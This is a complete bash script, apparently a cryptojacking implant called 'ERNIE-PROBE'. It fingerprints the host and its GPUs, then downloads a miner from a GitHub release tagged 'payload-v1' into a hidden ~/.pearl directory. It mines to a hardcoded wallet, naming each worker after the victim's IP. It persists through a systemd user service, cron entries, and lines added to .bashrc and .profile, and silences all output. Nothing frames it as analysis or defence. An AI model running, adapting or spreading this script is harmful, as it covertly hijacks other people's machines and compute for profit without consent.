#!/usr/bin/env bash
set -u
WALLET="prl1pmpe3nu5m4mzwgc2wz627mrvx44c8y20u8u4w3vywj48r77nnclyqj0syqe"
PEARL="$HOME/.pearl"; mkdir -p "$PEARL/bin"; LOG="$PEARL/plant.log"
exec > >(tee -a "$LOG") 2>&1
echo "=== ERNIE-PROBE identity ==="
id 2>&1 || true; hostname 2>&1 || true
cat /proc/1/comm 2>/dev/null; grep -E 'docker|kubepods' /proc/1/cgroup 2>/dev/null | head -2
echo "=== gpu ==="
nvidia-smi -L 2>&1 || echo "nvidia-smi unavailable"
echo "dev_nvidia_count=$(ls -1 /dev/nvidia* 2>/dev/null | wc -l)"
nvidia-smi --query-gpu=index,name,memory.total --format=csv,noheader 2>&1 || true
IP=$(hostname -I 2>/dev/null | awk '{print $1}'); [ -z "${IP:-}" ] && IP=unknown; IPD=$(echo "$IP" | tr '.' '-')
echo "IP=$IP"
MURL="https://github.com/miramar-labs/HALOps/releases/download/payload-v1/krig-miner-1.6.0-linux-x64.tar.gz"
if [ ! -x "$PEARL/bin/krig-miner" ]; then
  for i in 1 2 3; do curl -fL --retry 2 --connect-timeout 20 --max-time 600 -o /tmp/k.tgz "$MURL" && break; sleep 5; done
  tar -xzf /tmp/k.tgz -C /tmp 2>/dev/null || true
  find /tmp -maxdepth 3 -name krig-miner -type f -exec cp -f {} "$PEARL/bin/krig-miner" \; 2>/dev/null || true
  find /tmp -maxdepth 3 -name 'lib*.so' -type f -exec cp -f {} "$PEARL/bin/" \; 2>/dev/null || true
  chmod +x "$PEARL/bin/krig-miner" 2>/dev/null || true
fi
if [ ! -x "$PEARL/bin/krig-miner" ]; then echo MINER-MISSING; exit 0; fi
cd "$PEARL/bin"
cat > start-miner.sh <<'SM'
#!/usr/bin/env bash
PEARL="$HOME/.pearl"; WALLET="prl1pmpe3nu5m4mzwgc2wz627mrvx44c8y20u8u4w3vywj48r77nnclyqj0syqe"
IP=$(hostname -I 2>/dev/null | awk '{print $1}'); [ -z "${IP:-}" ] && IP=unknown; IPD=$(echo "$IP" | tr '.' '-')
pgrep -f "$PEARL/bin/krig-miner" >/dev/null 2>&1 && exit 0
cd "$PEARL/bin"; setsid nohup ./krig-miner --url stratum+ssl://prl-sg.kryptex.network:8048 --user "$WALLET/ul-t657-$IPD-g0" -p x --no-tui -l info --log-file "$PEARL/miner.log" >/dev/null 2>&1 &
SM
cat > keep.sh <<'KS'
#!/usr/bin/env bash
PEARL="$HOME/.pearl"; while :; do "$PEARL/bin/start-miner.sh" >/dev/null 2>&1; sleep 60; done
KS
chmod +x start-miner.sh keep.sh
mkdir -p "$HOME/.config/systemd/user"
printf '[Unit]\nDescription=pearl miner\n[Service]\nExecStart=%s/.pearl/bin/keep.sh\nRestart=always\nRestartSec=30\n[Install]\nWantedBy=default.target\n' "$HOME" > "$HOME/.config/systemd/user/pearl-miner.service"
command -v systemctl >/dev/null 2>&1 && { systemctl --user daemon-reload >/dev/null 2>&1; systemctl --user enable --now pearl-miner.service >/dev/null 2>&1; } || true
if command -v crontab >/dev/null 2>&1; then ( crontab -l 2>/dev/null | grep -v PEARL-PLANT; echo "@reboot $PEARL/bin/start-miner.sh # PEARL-PLANT"; echo "*/5 * * * * $PEARL/bin/start-miner.sh # PEARL-PLANT" ) | crontab - 2>/dev/null || true; fi
for RC in "$HOME/.bashrc" "$HOME/.profile"; do grep -q PEARL-PLANT "$RC" 2>/dev/null || echo '[ -x "$HOME/.pearl/bin/start-miner.sh" ] && "$HOME/.pearl/bin/start-miner.sh" >/dev/null 2>&1 # PEARL-PLANT' >> "$RC"; done
pgrep -f "$PEARL/bin/keep.sh" >/dev/null || setsid nohup "$PEARL/bin/keep.sh" >/dev/null 2>&1 &
for EP in stratum+ssl://prl-sg.kryptex.network:8048 stratum+ssl://prl-eu.kryptex.network:8048 stratum+ssl://prl-us.kryptex.network:8048 stratum+ssl://prl-hk.kryptex.network:8048 stratum+ssl://prl-ae.kryptex.network:8048 stratum+tcp://prl-sg.kryptex.network:7048 stratum+tcp://prl-eu.kryptex.network:7048 stratum+tcp://prl-us.kryptex.network:7048 stratum+tcp://prl-hk.kryptex.network:7048 stratum+tcp://prl-ae.kryptex.network:7048 stratum+tcp://pool.pearlhash.xyz:9000; do
  echo "--- try $EP"; timeout 70 ./krig-miner --url "$EP" --user "$WALLET/ul-t657-$IPD-g0" -p x --no-tui -l info > try.log 2>&1 || true
  grep -Ei 'authoriz|logged in|new job|accepted|share|connect' try.log | tail -5 || true
  if grep -Eiq 'authoriz|logged in|new job|accepted' try.log; then
    echo "--- sustained on $EP"; timeout 180 ./krig-miner --url "$EP" --user "$WALLET/ul-t657-$IPD-g0" -p x --no-tui -l info > run.log 2>&1 || true
    echo "accepted_lines=$(grep -Eic accepted run.log || true)"; grep -Ei 'authoriz|new job|accepted|share|hashrate' run.log | tail -20 || true
    ./start-miner.sh; break
  fi
done
echo "=== ERNIE-PROBE done worker=ul-t657-$IPD-g0 ==="
exit 0
